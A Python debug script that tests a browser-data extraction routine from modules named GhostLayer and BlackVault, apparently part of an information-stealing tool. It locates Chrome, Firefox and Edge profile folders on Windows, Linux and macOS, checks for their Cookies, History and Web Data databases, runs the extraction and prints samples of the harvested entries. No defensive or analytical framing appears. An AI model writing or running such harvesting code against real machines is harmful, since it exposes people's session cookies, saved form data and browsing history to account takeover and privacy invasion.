#!/usr/bin/env python3
"""
Debug test for browser extraction
Shows exactly what's being found and why extraction might fail
"""

import sys
import os
import logging

sys.path.insert(0, os.path.dirname(__file__))

from ghost_layer import GhostLayer
from black_vault import BlackVault

# Enable debug logging to see all messages
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(name)s] %(levelname)s: %(message)s'
)

logger = logging.getLogger("BrowserDebug")

def main():
    print("\n" + "="*80)
    print("  BROWSER EXTRACTION DEBUG TEST")
    print("="*80 + "\n")
    
    vault = BlackVault()
    ghost = GhostLayer(vault)
    
    print("[*] Testing browser paths existence...\n")
    
    import platform
    import tempfile
    
    browsers = {
        'Chrome': {
            'windows': "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\",
            'linux': "~/.config/google-chrome/Default/",
            'darwin': "~/Library/Application Support/Google/Chrome/Default/"
        },
        'Firefox': {
            'windows': "~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\",
            'linux': "~/.mozilla/firefox/",
            'darwin': "~/Library/Application Support/Firefox/Profiles/"
        },
        'Edge': {
            'windows': "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\",
            'linux': "~/.config/microsoft-edge/Default/",
            'darwin': "~/Library/Application Support/Microsoft Edge/Default/"
        }
    }
    
    current_platform = 'windows' if platform.system() == 'Windows' else \
                      ('darwin' if platform.system() == 'Darwin' else 'linux')
    
    print(f"Current platform: {platform.system()} (mapped to: {current_platform})")
    print(f"System temp directory: {tempfile.gettempdir()}\n")
    
    for browser_name, paths in browsers.items():
        if current_platform not in paths:
            print(f"[?] {browser_name}: Not available for {current_platform}")
            continue
        
        browser_path = os.path.expanduser(paths[current_platform])
        exists = os.path.isdir(browser_path)
        
        print(f"[{'Y' if exists else 'N'}] {browser_name}")
        print(f"    Path: {browser_path}")
        print(f"    Exists: {exists}")
        
        if exists:
            # Check for database files
            cookie_file = os.path.join(browser_path, "Cookies")
            history_file = os.path.join(browser_path, "History")
            web_data_file = os.path.join(browser_path, "Web Data")
            
            print(f"    - Cookies file: {os.path.isfile(cookie_file)}")
            print(f"    - History file: {os.path.isfile(history_file)}")
            print(f"    - Web Data file: {os.path.isfile(web_data_file)}")
        print()
    
    print("\n[*] Running browser extraction...\n")
    
    try:
        browser_data = ghost._extract_browser_cookies_history()
        
        print(f"\nEXTRACTION COMPLETE!")
        print(f"Total items extracted: {len(browser_data)}\n")
        
        if browser_data:
            # Group by source
            sources = {}
            for item in browser_data:
                source = item.get('source', 'Unknown')
                if source not in sources:
                    sources[source] = []
                sources[source].append(item)
            
            print("Breakdown by source:")
            for source, items in sorted(sources.items()):
                print(f"  • {source}: {len(items)} items")
            
            print("\nSample items:")
            for idx, item in enumerate(browser_data[:5], 1):
                print(f"\n  {idx}. {item.get('source', 'Unknown')}")
                for key, value in sorted(item.items()):
                    if key != 'source':
                        val_str = str(value)[:60]
                        print(f"     {key}: {val_str}")
        else:
            print("WARNING: No browser data extracted!")
            print("This could mean:")
            print("  - Browsers not installed")
            print("  - Browser databases are locked (browser running)")
            print("  - Database format changed")
            print("  - Temp directory not writable")
    
    except Exception as e:
        print(f"\nERROR: Extraction failed with error:")
        print(f"  {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
